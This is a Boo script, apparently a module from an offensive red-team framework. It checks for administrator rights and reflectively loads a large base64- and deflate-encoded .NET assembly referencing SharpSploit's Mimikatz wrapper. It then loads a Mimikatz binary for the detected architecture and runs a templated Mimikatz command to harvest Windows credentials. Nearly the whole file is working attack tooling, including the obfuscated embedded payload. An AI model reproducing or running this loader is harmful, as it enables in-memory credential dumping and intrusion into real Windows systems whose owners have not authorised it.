import System
import System.Reflection
import System.IO
import System.IO.Compression
import System.Security.Principal

public static def IsHighIntegrity() as bool:
    identity = WindowsIdentity.GetCurrent()
    principal = WindowsPrincipal(identity)
    return principal.IsInRole(WindowsBuiltInRole.Administrator)

public static def Decompress(compressed as (byte)) as (byte):
    using inputStream = MemoryStream(compressed.Length):
        inputStream.Write(compressed, 0, compressed.Length)
        inputStream.Seek(0, SeekOrigin.Begin)
        using outputStream = MemoryStream():
            using deflateStream = DeflateStream(inputStream, CompressionMode.Decompress):
                buffer = Array.CreateInstance(Byte, 4096)
                bytesRead = deflateStream.Read(buffer, 0, buffer.Length)
                outputStream.Write(buffer, 0, bytesRead)
                while bytesRead != 0:
                    bytesRead = deflateStream.Read(buffer, 0, buffer.Length)
                    outputStream.Write(buffer, 0, bytesRead)

                return outputStream.ToArray()

public static def Main():
    CompressedPEBytes32 = "COMPRESSED_PE_x86"
    CompressedPEBytes64 = "COMPRESSED_PE_x64"
    PELoader = "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"

    if IsHighIntegrity():
        print "[+] Running in high integrity process"

        assembly = Assembly.Load(Decompress(Convert.FromBase64String(PELoader)))
        Mimikatz as duck = assembly.GetType("SharpSploit.Mimikatz")
        if IntPtr.Size == 4:
            print "[*] In 32 bit process"
            Mimikatz.Load(Decompress(Convert.FromBase64String(CompressedPEBytes32)))
        elif IntPtr.Size == 8:
            print "[*] In 64 bit process"
            Mimikatz.Load(Decompress(Convert.FromBase64String(CompressedPEBytes64)))

        print Mimikatz.Command("MIMIKATZ_COMMAND")
    else:
        print "[-] Not in high integrity process"
